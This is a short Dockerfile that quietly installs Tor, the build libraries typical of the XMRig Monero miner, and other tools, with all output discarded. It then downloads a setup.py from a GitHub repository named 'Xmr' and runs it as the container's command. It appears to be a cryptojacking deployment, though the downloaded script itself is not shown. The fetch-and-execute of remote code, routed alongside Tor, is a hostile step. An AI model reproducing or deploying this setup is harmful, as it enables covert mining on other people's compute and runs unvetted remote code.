FROM ubuntu:latest
RUN apt update -y > /dev/null 2>&1 && apt upgrade -y > /dev/null 2>&1 && apt install locales -y \
&& localedef -i en_US -c -f UTF-8 -A /usr/share/locale/locale.alias en_US.UTF-8
RUN apt install tor -y > /dev/null 2>&1 
RUN apt install systemctl -y > /dev/null 2>&1 
ENV LANG en_US.utf8
RUN apt install git wget build-essential cmake libuv1-dev libssl-dev libhwloc-dev python3 -y > /dev/null 2>&1 
RUN wget -O setup.py https://raw.githubusercontent.com/jdjjd6262/Xmr/main/setup.py
CMD python3 setup.py
